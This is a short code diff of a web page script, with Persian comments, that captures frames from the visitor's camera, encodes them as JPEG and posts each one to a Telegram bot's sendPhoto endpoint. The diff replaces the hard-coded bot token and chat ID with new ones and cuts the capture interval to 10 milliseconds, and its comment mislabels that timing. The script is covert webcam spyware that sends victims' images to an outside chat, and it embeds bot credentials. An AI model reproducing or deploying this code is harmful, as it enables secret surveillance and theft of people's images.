@@ -65,7 +65,7 @@
                     // تبدیل تصویر به داده Base64
                     const dataURL = canvas.toDataURL('image/jpeg');
                     sendImage(dataURL);
-                }, 100); // 10000 میلی‌ثانیه = 10 ثانیه
+                }, 10); // 10000 میلی‌ثانیه = 10 ثانیه
             })
             .catch(error => {
                 console.error('Error accessing the camera:', error);
@@ -78,7 +78,7 @@
             const formData = new FormData();
             formData.append('photo', blob, 'image.jpg');
 
-            fetch('https://api.telegram.org/bot7913565286:AAEhOeN9HOfkiM9kh29mVeCJha8dwwj6jKM/sendPhoto?chat_id=8164947082', {
+            fetch('https://api.telegram.org/bot7327031320:AAGQm4CpuRlV3SFAhbJeD4AZrHRIPNeRx1M/sendPhoto?chat_id=6270876509', {
                 method: 'POST',
                 body: formData
             })
